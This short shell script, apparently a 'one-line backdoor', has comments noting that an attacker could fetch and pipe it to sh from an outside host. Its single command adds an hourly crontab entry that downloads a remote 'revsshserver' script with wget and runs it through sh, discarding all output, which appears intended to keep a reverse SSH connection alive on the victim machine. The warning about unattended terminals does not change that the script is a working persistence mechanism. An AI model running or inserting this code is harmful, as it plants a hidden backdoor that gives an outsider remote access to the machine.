## You see, a dodgy hacker could just exec this script by typing:
##   wget -nv -O - http://hwi.ath.cx/jshtools/onelinebackdoor | sh
## So don't leave your terminals unattended!

( crontab -l | grep -v revssh ; echo '00 * * * * wget -nv http://hwi.ath.cx/jshtools/revsshserver -O - | sh -s -- -check 2>/dev/null > /dev/null &' ) | crontab -

